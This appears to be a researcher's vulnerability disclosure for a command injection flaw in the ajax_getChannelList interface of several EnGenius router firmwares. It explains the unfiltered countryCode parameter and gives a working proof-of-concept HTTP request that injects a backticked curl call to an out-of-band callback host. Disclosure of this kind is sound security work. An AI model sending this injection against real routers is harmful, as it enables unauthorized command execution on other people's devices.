=== Content from k9u7kv33ub.feishu.cn_bfb8ef2b_20250114_224918.html ===
         ShareCommand Injection In ajax\_getChannelList interface Of ENGENIUS Router  Type '/' for commands
# Command Injection In ajax\_getChannelList interface Of ENGENIUS Router​

![](https://s3-imfile.feishucdn.com/static-resource/v1/e6f5a9e2-91f0-4b42-9c06-c702a7925879~?image_size=72x72&cut_type=default-face&quality=&format=jpeg&sticker_format=.webp)Feishu user 1258Modified November 18, 2024BUG\_Author: i3eg1nner​Vendor: [engenius]([https://www.engeniustech.com](https://www.engeniustech.com/wp_firmware/))​Firmware: [Firmware download page](<https://www.engeniustech.com/wp_firmware/>)​Affected Version:​The latest version firmware of all routing devices and all previous versions, specific version information is as follows.​ENH1350EXT-3.5​ENS500-AC-v3.7.20​ens620ext-all-v3.9.1.7​Description:​Engenius multiple devices /admin/network/ajax\_getChannelList interface has a command injection vulnerability, after the user logs in to the device, the countryCode parameters command injection, the final system can successfully execute the command, can directly obtain system permissions.​Proof of Concept:​After the firmware is decrypted, it needs to reverse compile the lua bytecode and then analyze it. The core code of the vulnerability in the lua file is shown in the following figure.​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/AkqMbyFuTocnVexBjDrcAoIhn5e/?fallback_source=1&height=1280&mount_node_token=ZLsJdoaaYo8QxHx1MmPcmGdNnuc&mount_point=docx_image&policy=equal&width=1280)When the energy saving mode is not turned on, the data packet contains the user input countryCode parameter, the country\_code as a parameter, passed to the settings function, the setting function passes country to the iwpriv\_SetGreenMode function, iwpriv\_SetGreenMode function does not filter the country\_code parameters, directly concatenated to the command, resulting in command execution.​​BashGET /cgi-bin/luci/;stok=4a73d6b38b7dae80406fbcd32195dd9e/admin/network/ajax\_getChannelList?countryCode=`curl%20ovnezs0so8rjlwqo2bx04jbolfr6fxfl4.oastify.com`&reg\_domain=0&greenmode\_wifi0=0&greenmode\_wifi1=1 HTTP/1.1​Host: IP​Cookie: sysauth=e80115476832c932ab9a48c544d8e701​Sec-Ch-Ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"​Accept: application/json, text/javascript, \*/\*; q=0.01​X-Requested-With: XMLHttpRequest​Sec-Ch-Ua-Mobile: ?0​User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36​Sec-Ch-Ua-Platform: "Windows"​Sec-Fetch-Site: same-origin​Sec-Fetch-Mode: cors​Sec-Fetch-Dest: empty​Accept-Encoding: gzip, deflate, br​Accept-Language: en-GB,en;q=0.9,en-US;q=0.8​Priority: u=0, i​Connection: close​![common.docs_name - LarkCCM_Docs_Menu_Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/v2/cover/GTF2bUOZMovs7Wxcm9Sc2sG6nRb/?fallback_source=1&height=1280&mount_node_token=O3iTd8HOZoLAXkxuJsQca8wHnNh&mount_point=docx_image&policy=equal&width=1280)We tried to contact the ENGENIUS manufacturer, but there was no response.​
